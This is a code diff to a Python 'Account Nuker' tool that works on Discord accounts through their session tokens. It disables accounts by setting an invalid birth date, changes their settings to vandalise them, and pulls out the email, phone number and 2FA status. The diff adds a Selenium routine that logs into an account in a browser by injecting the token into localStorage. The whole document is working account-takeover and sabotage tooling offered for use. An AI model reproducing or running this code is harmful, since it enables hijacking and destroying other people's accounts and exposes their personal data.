@@ -6,6 +6,8 @@ import time
 import os
 
 from colorama import Fore, init
+from selenium import webdriver
+from datetime import datetime
 from itertools import cycle
 
 init(convert=True)
@@ -31,6 +33,23 @@ class Login(discord.Client):
             print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
             input("Press any key to exit..."); exit(0)
 
+def tokenLogin(token):
+    opts = webdriver.ChromeOptions()
+    opts.add_experimental_option("detach", True)
+    driver = webdriver.Chrome('chromedriver.exe', options=opts)
+    script = """
+            function login(token) {
+            setInterval(() => {
+            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+            }, 50);
+            setTimeout(() => {
+            location.reload();
+            }, 2500);
+            }
+            """
+    driver.get("https://discordapp.com/login")
+    driver.execute_script(script + f'\nlogin("{token}")')
+
 def tokenInfo(token):
     headers = {'Authorization': token, 'Content-Type': 'application/json'}  
     r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
@@ -44,14 +63,13 @@ def tokenInfo(token):
             [{Fore.RED}User ID{Fore.RESET}]         {userID}
             [{Fore.RED}User Name{Fore.RESET}]       {userName}
             [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
+
             [{Fore.RED}Email{Fore.RESET}]           {email}
             [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
             [{Fore.RED}Token{Fore.RESET}]           {token}
+
             ''')
             input()
-    else:
-      print(f"[{Fore.RED}-{Fore.RESET}] Invalid token")
-      input("Press any key to exit..."); exit(0)
 
 def tokenFuck(token):
     headers = {'Authorization': token}
@@ -73,7 +91,7 @@ def tokenFuck(token):
         requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
 
 def tokenDisable(token):
-    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2017-7-16'})
+    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '9999-7-16'})
     if r.status_code == 400:
         print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
         input("Press any key to exit...")
@@ -92,11 +110,13 @@ def getBanner():
                 ░ ░░░    ░   ░░ ░    ░ ░░░    ░   ░░ ░    ░ ░░░    ░   ░░ ░     {Fore.RED}({Fore.RESET}Account Nuker{Fore.RED}){Fore.RESET}
                 ░ ░ ░    ░   ░       ░ ░ ░    ░   ░       ░ ░ ░    ░   ░          - MassDM removed...
                 ░   ░        ░  ░    ░   ░        ░  ░    ░   ░        ░  ░       + Token info added
-                                                             
+                                                                                  + Token login added
         
                 [{Fore.RED}1{Fore.RESET}] Disable the account 
                 [{Fore.RED}2{Fore.RESET}] Token fuck the account
                 [{Fore.RED}3{Fore.RESET}] Grab info about the account
+                [{Fore.RED}4{Fore.RESET}] Log into a token
+
     '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
     return banner
 
@@ -118,6 +138,10 @@ def startMenu():
     elif choice == '3':
         print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
         tokenInfo(token)
+    
+    elif choice == '4':
+        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
+        tokenLogin(token)
 
     elif choice.isdigit() == False:
         clear()
